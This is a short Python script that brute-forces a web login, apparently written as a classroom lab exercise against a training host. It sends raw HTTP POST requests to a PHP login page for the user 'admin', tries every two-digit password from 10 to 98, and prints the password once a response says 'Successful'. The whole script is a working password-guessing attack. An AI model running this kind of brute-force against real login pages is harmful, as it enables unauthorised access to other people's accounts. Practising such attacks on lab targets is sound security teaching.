import socket

addr = 'target1.bowneconsulting.com'
port = 80


for password in range(10,99):
	s = socket.socket()
	s.settimeout(2)
	s.connect((addr, port))

	req = '''POST /php/login3.php HTTP/1.1\r
Host: target1.bowneconsulting.com\r
User-Agent: python\r
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r
Accept-Language: en-US,en;q=0.5\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: 12\r
Origin: http://target1.bowneconsulting.com\r
DNT: 1\r
Connection: keep-alive\r
Referer: http://target1.bowneconsulting.com/php/login3.php\r
Upgrade-Insecure-Requests: 1\r
\r
u=admin&p={}\r
'''

	req = req.format(str(password))
	s.send(req.encode())
	resp = s.recv(1024).decode()
	if "Successful" in resp:
		print("Password is " + str(password))
		break

	s.close()



	

	